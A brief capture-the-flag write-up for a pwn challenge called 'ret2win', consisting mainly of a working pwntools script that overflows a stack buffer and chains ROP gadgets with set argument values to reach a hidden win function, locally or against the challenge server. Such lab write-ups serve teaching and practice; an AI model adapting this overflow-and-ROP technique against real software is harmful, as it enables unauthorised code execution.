#writeup
# ret2win
+ Pwn
+ 83 pts
***
##### Description
>Are you looking for an exploit dev job. Well apply to the Republic of Potatoes. We are looking for the best hackers out there. Download the binary, find the secret door and remember to pass the right password.
***
##### Files
`ret2win` - ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=6407290ddc178ebcff6a243a585c21e8c32a440b, for GNU/Linux 3.2.0, not stripped
***
##### Solve
```python
#!/usr/bin/python3
  
from pwn import *
  
context.binary='./ret2win'
context.terminal= ['tmux', 'splitw', '-v']
  
if args['REMOTE']:
    p = remote('ret2win.challenges.ctf.ritsec.club', 1337)
else:
    p = process('./ret2win')
    #p = gdb.debug('./ret2win', '''
    #    starti
    #''')
  
e = ELF('./ret2win')
win = e.sym.supersecrettoplevelfunction
  
p.recvuntil(b'(ROP)\n')  #does not work on remote, buffer not flushed?
p.sendline(40*b'A'+p64(0x4012b3)+p64(0xcafebabe)+p64(0x4012b1)+p64(0xc0debabe)+p64(0xffffffff)+p64(win))
p.interactive()
```
